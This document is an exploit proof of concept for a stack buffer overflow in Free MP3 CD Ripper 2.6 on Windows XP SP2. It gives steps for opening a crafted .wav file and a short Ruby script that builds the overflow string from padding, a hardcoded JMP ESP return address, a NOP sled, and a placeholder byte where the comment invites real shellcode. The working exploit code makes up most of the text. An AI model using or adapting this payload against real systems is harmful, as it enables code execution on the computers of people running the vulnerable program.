# Exploit Title: Free MP3 CD Ripper 2.6 (wav) 0-day
# Date: 30/03/2010
# Author: Richard leahy
# Software Link: http://www.soft32.com/Download/Free/Free_MP3_CD_Ripper/4-250188-1.html
# Version: 2.6
# Tested on: Windows Xp Sp2

#to exploit this  open up the application select file -> wav converter -> wav to mp3

#use your favourite programming language and print out the contents into a text file. save the text #file as a .wav
#then open up the wav file and boom.

#feel free to email me leahy_rich@hotmail.com

#code

!#/usr/bin/env ruby
nop = "\x90" # nop
shellcode = "\xCC" #just an interupt can be replaced by proper shellcode
jmp_esp = "\x32\xfa\xca\x76" #find a jmp esp i will use imagehlp  , little endian so reverse it
boom = "A" * 4112 + jmp_esp + nop * 50 + shellcode

puts boom